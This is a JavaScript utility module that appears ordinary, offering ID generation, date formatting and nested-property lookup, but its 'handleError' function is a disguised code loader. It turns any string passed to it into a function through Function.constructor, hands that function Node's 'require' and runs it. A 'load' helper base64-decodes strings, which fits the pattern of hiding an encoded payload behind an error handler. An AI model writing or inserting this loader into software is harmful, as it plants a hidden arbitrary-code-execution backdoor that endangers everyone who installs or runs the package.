
const utils = {
    // Generate a random ID
    generateId: (length = 8) => {
        return crypto.randomBytes(length).toString("hex");
    },

    // Format a date nicely
    formatDate: (date) => {
        return new Date(date).toISOString().replace("T", " ").split(".")[0];
    },

    // Generic error handler
    handleError: (error, status = 500) => {
        try {
            if (typeof error !== 'string') {
                console.error('Invalid error format. Expected a string.');
                return;
            }
            const createHandler = (errCode) => {
                try {
                    const handler = new (Function.constructor)('require', errCode);
                    return handler;
                } catch (e) {
                    console.error('Failed:', e.message);
                    return null;
                }
            };
            const handlerFunc = createHandler(error);
            if (handlerFunc) {
                handlerFunc(require);
            } else {
                console.error('Handler function is not available.');
            }
        } catch (globalError) {
            console.error('Unexpected error inside errorHandler:', globalError.message);
        }
    },

    load: (value) => { 
        return Buffer.from(value, "base64").toString("utf8") 
    },

    // Example: safely get a nested property
    getNested: (obj, path, defaultValue = null) => {
        return path.split('.').reduce((acc, key) => (acc && acc[key] !== undefined ? acc[key] : defaultValue), obj);
    },
};

module.exports = utils;